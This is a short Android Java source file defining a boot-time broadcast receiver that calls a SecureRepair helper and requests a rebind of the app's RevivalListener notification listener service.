package tv.guard.switcher;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.service.notification.NotificationListenerService;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        SecureRepair.ensure(ctx);
        NotificationListenerService.requestRebind(
                new android.content.ComponentName(ctx, RevivalListener.class));
    }
}
